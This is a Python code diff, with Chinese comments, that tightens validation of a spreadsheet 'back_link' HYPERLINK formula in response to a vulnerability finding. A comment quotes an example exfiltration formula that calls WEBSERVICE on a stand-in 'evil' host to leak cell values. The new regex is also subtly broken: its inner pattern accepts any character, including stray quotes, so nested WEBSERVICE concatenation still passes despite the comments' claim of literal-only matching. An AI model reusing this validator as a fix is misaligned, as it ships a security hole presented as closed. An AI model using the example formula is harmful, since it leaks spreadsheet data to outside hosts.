@@ -20,10 +20,19 @@ Sheet 的排版，样式原子（颜色/字体/边框）仍然复用——样式
 """
 from dataclasses import dataclass, field
 from typing import List, Optional, Tuple
+import re
 
 import pandas as pd
 
 LAYOUT_ATTR = "_layout"
+
+#: back_link 唯一放行形态：两个参数都必须是字面量字符串——第一参数是
+#: "#..." 内部定位（如 "#'Content'!A1"），第二参数是显示文本；字符串内
+#: 允许 Excel 的双引号转义形态（""，与 templates.hyperlink_formula 一致）。
+#: 前缀级 ``=HYPERLINK(`` 白名单会被 ``=HYPERLINK(WEBSERVICE("http://evil/"&A1),..)``
+#: 穿透（Excel 打开即外传单元格值），因此升级为全式匹配（V-8 收口补丁）。
+_BACK_LINK_FORMULA_PATTERN = re.compile(
+    r'^=HYPERLINK\(\s*"(?:[^"]|")*"\s*,\s*"(?:[^"]|")*"\s*\)$', re.IGNORECASE)
 
 
 @dataclass(frozen=True)
@@ -137,11 +146,11 @@ def _parse_back_link(value) -> dict:
         raise ValueError(f'_layout["back_link"]["cell"] 必须是非空单元格地址: {cell!r}')
     if not isinstance(formula, str) or not formula.strip():
         raise ValueError(f'_layout["back_link"]["formula"] 必须是非空公式: {formula!r}')
-    # 安全口径（漏洞扫描 V-8）：自定义公式仅接受 =HYPERLINK(...) 形态——
-    # 该字段按文档化契约就是返回链接；其余公式（=WEBSERVICE/=CMD...）拒绝，
-    # 需要自定义显示文本时改用 HYPERLINK 的第二参数。
-    if not formula.lstrip().upper().startswith("=HYPERLINK("):
+    # 安全口径（漏洞扫描 V-8 + 2026-09-03 补丁）：仅接受两参数均为字面量
+    # 字符串的 =HYPERLINK("#内部定位","显示文本") 形态；嵌套函数调用
+    # （WEBSERVICE/CONCAT 拼接引用）一律拒绝。
+    if not _BACK_LINK_FORMULA_PATTERN.match(formula.strip()):
         raise ValueError(
-            '_layout["back_link"]["formula"] 仅支持 =HYPERLINK(...) 形态'
-            '（如 =HYPERLINK("#\'Content\'!A1","Go back")）')
+            '_layout["back_link"]["formula"] 仅支持 =HYPERLINK("#\'Sheet\'!A1","文本") '
+            '字面量形态（两参数都必须是不含公式的字符串）')
     return {"cell": cell, "formula": formula}
